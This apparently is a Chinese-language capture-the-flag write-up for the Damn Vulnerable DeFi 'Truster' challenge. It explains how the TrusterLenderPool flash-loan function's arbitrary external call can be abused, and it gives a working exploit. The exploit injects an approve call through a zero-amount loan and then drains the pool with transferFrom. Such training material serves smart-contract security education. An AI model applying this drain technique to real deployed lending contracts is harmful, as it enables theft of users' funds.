# Solution

## contract

`TrusterLenderPool`合约提供针对DVT token的闪电贷方法
```solidity
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
```

- 首先计算当前合约的dvt token余额`balanceBefore`
- 乐观转账amount额度的dvt token给borrower
- 执行传入的target合约方法，通过calldata方法调用
- 判断当前合约的dvt余额是否比之前少，并revert

`target.functionCall(data);` 这一段执行外部合约的方法是攻击的目标

## script

- 部署dvt token合约
- 部署`TrusterLenderPool`合约
- 向合约转入`TOKENS_IN_POOL`个dvt token
- 执行攻击脚本
- 校验攻击后合约的dvt token余额为0，用户获取全部`TOKENS_IN_POOL`个dvt token

## code

通过两笔交易的攻击方法：
- 首先调用合约的闪电贷方法，额度为0，calldata为编码好的dvt `approve`方法
- 执行闪电贷交易成功后，再直接调用合约的`transferFrom`方法将合约内的token全部转到用户地址下

```javascript
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const calldata = token.interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL])
        await pool.connect(player).flashLoan(0,player.address, token.address, calldata)
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)
    });
```